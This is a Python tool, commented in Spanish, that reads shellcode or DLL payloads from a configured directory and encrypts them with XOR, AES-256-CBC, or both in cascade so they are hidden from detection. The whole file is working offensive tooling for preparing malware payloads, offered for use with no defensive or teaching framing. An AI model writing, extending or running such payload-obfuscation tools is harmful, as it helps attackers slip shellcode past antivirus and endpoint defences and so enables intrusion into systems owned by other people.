import os
import json
from Crypto.Cipher import AES

# Carga configuracin desde settings.json, puedes modificarlo.
def load_settings():
    with open("config/settings.json", "r") as f:
        return json.load(f)

# Cifrado XOR clasico con clave dinámica
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Cifrado AES-CBC con padding PKCS7
def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pad = 16 - (len(data) % 16)
    data += bytes([pad] * pad)
    return cipher.encrypt(data)

# Interfaz 
def encrypt_shellcode():
    config = load_settings()
    shell_dir = config["payload_input_dir"]
    out_dir = config["payload_output_dir"]
    xor_key = config["xor_key"].encode()
    aes_key = bytes.fromhex(config["aes_key"])
    aes_iv = bytes.fromhex(config["aes_iv"])

    # Mostrar archivos 
    files = [f for f in os.listdir(shell_dir) if f.endswith(".bin") or f.endswith(".dll")]
    if not files:
        print("[-] No hay archivos en:", shell_dir)
        return

    print("\n[+] Shellcodes disponibles:")
    for idx, f in enumerate(files):
        print(f"[{idx}] {f}")

    sel = input("Seleccione archivo a cifrar: ").strip()
    if not sel.isdigit() or int(sel) >= len(files):
        print("[-] Selección inválida")
        return

    fname = files[int(sel)]
    path = os.path.join(shell_dir, fname)
    with open(path, "rb") as f:
        data = f.read()

    print("\n[+] Modo de cifrado:")
    print("[1] XOR")
    print("[2] AES-256-CBC")
    print("[3] AES + XOR (cascada)")
    method = input(">> ").strip()

    if method == "1":
        encrypted = xor_encrypt(data, xor_key)
        suffix = ".xor.dat"
    elif method == "2":
        encrypted = aes_encrypt(data, aes_key, aes_iv)
        suffix = ".aes.dat"
    elif method == "3":
        tmp = aes_encrypt(data, aes_key, aes_iv)
        encrypted = xor_encrypt(tmp, xor_key)
        suffix = ".aesxor.dat"
    else:
        print("[-] Metodo invalido")
        return

    out_path = os.path.join(out_dir, fname + suffix)
    with open(out_path, "wb") as f:
        f.write(encrypted)

    print(f"[+] Archivo cifrado guardado en: {out_path}")
